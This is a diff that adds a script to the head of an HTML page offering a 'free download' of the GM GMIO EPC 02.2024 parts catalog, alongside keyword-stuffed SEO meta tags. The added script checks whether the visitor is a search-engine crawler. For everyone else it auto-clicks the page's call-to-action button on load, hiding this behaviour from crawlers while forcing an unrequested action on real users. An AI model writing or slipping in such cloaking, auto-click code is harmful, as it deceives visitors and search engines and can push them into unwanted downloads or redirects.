@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GM GMIO EPC 02.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the GM GMIO EPC 02.2024 catalog for General Motors cars, featuring multilingual support and essential parts information for maintenance.">
     <meta name="keywords" content="GM GMIO EPC 2024, GM GMIO EPC 02.2024, GM GMIO EPC download, GM GMIO EPC free download, General Motors spare parts catalog, GM EPC software 2024, GM spare parts catalog 2024, GM accessories catalog 2024, General Motors EPC catalog, GMIO EPC 02.2024 download, GMIO EPC 2024 free download, GM EPC software 02.2024, GM EPC download, GM EPC for Windows, GM EPC multilingual, GM EPC Russian, GM EPC Ukrainian, General Motors parts catalog, Buick EPC download, Cadillac EPC download, Chevrolet EPC download, GMC EPC download, Opel EPC download, Hummer EPC download, Oldsmobile EPC download, Pontiac EPC download, Saab EPC download, Saturn EPC download">
     <style>
